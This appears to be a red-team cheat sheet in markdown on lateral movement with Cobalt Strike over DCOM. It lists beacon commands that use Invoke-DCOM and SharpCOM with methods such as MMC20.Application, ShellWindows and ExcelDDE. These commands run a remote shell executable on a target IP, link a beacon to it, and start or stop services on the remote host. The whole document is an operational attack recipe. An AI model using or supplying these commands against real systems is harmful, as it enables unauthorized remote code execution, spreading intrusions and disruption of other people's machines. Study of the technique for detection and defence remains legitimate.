# Cobalt Strike

Search Tag(s): #lateral-movement #cobalt-strike #dcom #windows

## 01 - Spawn Callback Shell

### 1.1 - Invoke-DCOM

- Spawn the callback shell.

```
beacon> powershell-import Invoke-DCOM.ps1

beacon> <powershell | powerpick> Invoke-DCOM -ComputerName <IP> -Method <MMC20.Application | ShellWindows | ShellBrowserWindow | ExcelDDE> -Command C:\path\to\remote\shell.exe

beacon> link <IP>
```

- Modify the service.

```
beacon> <powershell | powerpick> Invoke-DCOM -ComputerName <IP> -Method <ServiceCheck | MinimizeAll | ServiceStop | ServiceStart> "<service_name>"
```

### 1.2 - SharpCOM

```
beacon> execute-assembly /path/to/local/SharpCOM.exe --Method <ShellWindows | MMC | ShellBrowserWindow | ExcelDDE> --ComputerName <target_IP> --Command "C:\path\to\remote\shell.exe"
```

---
## References

- [[Invoke-DCOM]]

- [[SharpCOM]]